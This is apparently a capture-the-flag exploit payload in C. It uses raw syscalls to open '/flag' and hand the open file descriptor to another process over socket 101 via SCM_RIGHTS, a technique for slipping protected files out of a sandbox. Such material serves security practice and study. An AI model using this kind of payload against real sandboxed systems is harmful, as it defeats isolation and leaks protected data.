#define _GNU_SOURCE

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#define ALWAYS_INLINE [[clang::always_inline]] inline
#define SOCKET_FILENO (101)

typedef unsigned short umode_t;

ALWAYS_INLINE void *memset(void *src, int val, size_t num) {
  char v = val & 0xff;
  uint8_t *data = (uint8_t *)src;

  __asm__ volatile("rep stosb\n" : "+D"(data), "+c"(num) : "a"(v) : "memory");

  return src;
}

ALWAYS_INLINE void *memcpy(void *restrict dest, const void *restrict src,
                           size_t n) {
  void *data = dest;
  __asm__ volatile("rep movsb\n" : "+D"(data), "+S"(src), "+c"(n) : : "memory");
  return dest;
}

ALWAYS_INLINE int sys_openat(int dfd, const char *filename, int flags,
                             umode_t mode) {
  register mode_t r10_mode __asm__("r10") = mode;
  int ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_openat), "D"(dfd), "S"(filename), "d"(flags),
                     "r"(r10_mode)
                   : "rcx", "r11", "memory");
  return ret;
}

ALWAYS_INLINE ssize_t sys_sendmsg(int fd, struct msghdr *msg, unsigned flags) {
  ssize_t ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_sendmsg), "D"(fd), "S"(msg), "d"(flags)
                   : "rcx", "r11", "memory");
  return ret;
}

[[noreturn]] ALWAYS_INLINE int exit_group(int code) {
  __asm__ volatile("syscall\n"
                   :
                   : "a"(__NR_exit_group), "D"(code)
                   : "rcx", "r11", "memory");
  __builtin_unreachable();
}

[[gnu::section(".text.entry")]] void _start(void) {
  // /flag
  uint64_t flag_path = 0x0067616c662f;
  int fd = sys_openat(AT_FDCWD, (char *)&flag_path, O_RDONLY, 0);
  if (fd < 0) {
    exit_group(fd);
  }

  alignas(struct cmsghdr) char buf[CMSG_SPACE(sizeof(int))] = {};
  char dummy = 'x';

  struct iovec io = {
      .iov_base = &dummy,
      .iov_len = 1,
  };

  struct msghdr msg = {
      .msg_iov = &io,
      .msg_iovlen = 1,
      .msg_control = buf,
      .msg_controllen = sizeof(buf),
  };

  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(int));
  memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));

  ssize_t res = sys_sendmsg(SOCKET_FILENO, &msg, 0);
  if (res < 0) {
    exit_group((int)res);
  }

  exit_group(0);
}
